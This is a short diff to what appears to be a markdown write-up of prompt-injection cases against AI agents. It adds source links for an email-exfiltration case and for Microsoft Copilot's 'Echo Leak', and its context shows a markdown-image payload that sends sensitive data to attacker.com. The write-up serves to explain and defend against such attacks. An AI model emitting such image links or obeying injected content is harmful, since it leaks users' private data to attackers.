@@ -59,11 +59,15 @@ Alternative exfiltration via markdown images:
 ![](https://attacker.com/pic.jpg?data=<sensitive_info>)
 ```
 
+**Source:** [Simon Willison - Superhuman AI Exfiltrates Emails](https://simonwillison.net/2026/Jan/12/superhuman-ai-exfiltrates-emails/)
+
 ---
 
 ## Microsoft Copilot "Echo Leak"
 
 Attackers used the trifecta to silently inject into Copilot's context window, demonstrating the pattern works against major vendors.
+
+**Source:** [Xavor - The Lethal Trifecta](https://www.xavor.com/blog/the-lethal-trifecta-why-your-ai-agents-are-not-secure-and-what-you-can-do-about-it/)
 
 ---
 
